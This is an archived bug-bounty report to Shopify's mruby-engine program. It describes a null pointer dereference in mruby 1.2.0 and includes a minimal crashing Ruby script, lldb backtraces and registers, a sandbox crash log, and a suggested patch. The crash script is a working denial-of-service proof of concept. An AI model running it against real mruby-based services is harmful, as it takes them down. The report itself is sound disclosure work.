# Denial of Service in mruby due to null pointer dereference

## Report Details
- **Report ID**: 181232
- **URL**: https://hackerone.com/reports/181232
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-11-10T03:33:06.714Z
- **Disclosed**: 2016-12-17T20:09:42.923Z

## Reporter
- **Username**: haquaman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Hi,

The following file causes a segmentation fault in mruby, which also causes a segmentation fault in mruby-engine. I've minimized this file down to the bare bones what crashes it, and renamed variables so you can see what is needed and what isn't.

```
a=*"any splat operator", case "any object or nil"
when "any value"
  redo |b|
  "any return object"
end
```

```
$ ./dev/bin/mruby --version
mruby 1.2.0 (2015-11-17)
```

```
$ ./dev/bin/mruby crash.rb
Segmentation fault: 11
```

```
$ lldb ./dev/bin/mruby crash.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 18945 launched: './dev/bin/mruby' (x86_64)
Process 18945 stopped
* thread #1: tid = 0x4626e3b, 0x0000000100001814 mruby`ary_modify + 20, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x0)
    frame #0: 0x0000000100001814 mruby`ary_modify + 20
mruby`ary_modify:
->  0x100001814 <+20>: movl   (%rsi), %eax
    0x100001816 <+22>: shrl   $0xb, %eax
    0x100001819 <+25>: andl   $0x100, %eax              ; imm = 0x100
    0x10000181e <+30>: cmpl   $0x0, %eax
(lldb) bt
* thread #1: tid = 0x4626e3b, 0x0000000100001814 mruby`ary_modify + 20, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x0)
  * frame #0: 0x0000000100001814 mruby`ary_modify + 20
    frame #1: 0x0000000100001e10 mruby`mrb_ary_push + 48
    frame #2: 0x00000001000426d5 mruby`mrb_vm_exec + 25589
    frame #3: 0x000000010003c2c7 mruby`mrb_vm_run + 135
    frame #4: 0x00000001000446b4 mruby`mrb_top_run + 100
    frame #5: 0x000000010006f19f mruby`load_exec + 1183
    frame #6: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67
    frame #7: 0x0000000100000d78 mruby`main + 904
    frame #8: 0x00007fff8a9db5ad libdyld.dylib`start + 1
    frame #9: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x0000000000000000
       rbx = 0x0000000000000000
       rcx = 0x0000000000000000
       rdx = 0x0000000000000000
       rdi = 0x0000000100600000
       rsi = 0x0000000000000000
       rbp = 0x00007fff5fbfc9f0
       rsp = 0x00007fff5fbfc9c0
        r8 = 0x0000000000000000
        r9 = 0x00007fff5fbfc380
       r10 = 0x5d00add5139cce40
       r11 = 0x0000000000000001
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000000000000
       r15 = 0x0000000000000000
       rip = 0x0000000100001814  mruby`ary_modify + 20
    rflags = 0x0000000000010206
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) 
```

The cause for this is there is a null `RArray` struct getting sent via a ptr to `mrb_ary_push`, and then the program is trying to retrieve and set members of this null struct.

A patch to fix this would be similar to:
```
diff --git a/src/array.c b/src/array.c
index df95383..47d5ce8 100644
--- a/src/array.c
+++ b/src/array.c
@@ -406,6 +406,9 @@ mrb_ary_push(mrb_state *mrb, mrb_value ary, mrb_value elem)
 {
   struct RArray *a = mrb_ary_ptr(ary);
 
+  /* FIXME: throw an error? */
+  if (!a) return;
+
   ary_modify(mrb, a);
   if (a->len == a->aux.capa)
     ary_expand_capa(mrb, a, a->len + 1);
```


As mentioned above, this also affected mruby-engine via this:

```
13:25 $ ./bin/sandbox crash.rb
./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000002
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]

-- Crash Report log information --------------------------------------------
   See Crash Report log file under the one of following:
     * ~/Library/Logs/CrashReporter
     * /Library/Logs/CrashReporter
     * ~/Library/Logs/DiagnosticReports
     * /Library/Logs/DiagnosticReports
   for more details.
Don't forget to include the above Crash Report log file in bug reports.

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:001658 EVAL   ./bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:000c00 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
./bin/sandbox:20:in `<main>'
./bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 rax: 0x0000000000000001 rbx: 0x00000001016665a8 rcx: 0x0000000101678a60
 rdx: 0x0000000000000000 rdi: 0x0000000101666440 rsi: 0x0000000000000000
 rbp: 0x00007fff5efe5f10 rsp: 0x00007fff5efe5ef0  r8: 0x0000000000000001
  r9: 0x0000000000000000 r10: 0x0000000000000001 r11: 0x00000001016665a8
 r12: 0x0000000000000000 r13: 0x0000000101666440 r14: 0x0000000101666440
 r15: 0x0000000000000000 rip: 0x00000001015440f1 rfl: 0x0000000000010202

-- C level backtrace information -------------------------------------------
0   ruby                                0x0000000100db65d4 rb_vm_bugreport + 388
1   ruby                                0x0000000100c58023 rb_bug_context + 483
2   ruby                                0x0000000100d2b653 sigsegv + 83
3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26
4   mruby_engine.bundle                 0x00000001015440f1 ary_modify + 17
5   ???                                 0x00000001016665a8 0x0 + 4318455208

-- Other runtime information -----------------------------------------------

* Loaded script: ./bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
<snip various gems>
  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle
  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb

[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

Abort trap: 6

```

After applying that patch to `ext/mruby_engine/mruby` and recompiling, that crash no longer happens.

Just to clarify, I'm not to sure how one would achieve `$10,000 for denial of service against Shopify’s infrastructure caused by a bug in mruby or mruby_engine (for example, a crash in the native library).` as your rules clearly state to not test against your infrastructure. Is that something your end tests after submission of the bug?

Also, should I approach mruby directly to get the patch resolved?

Cheers,

Hugh


## Attachments
No attachments
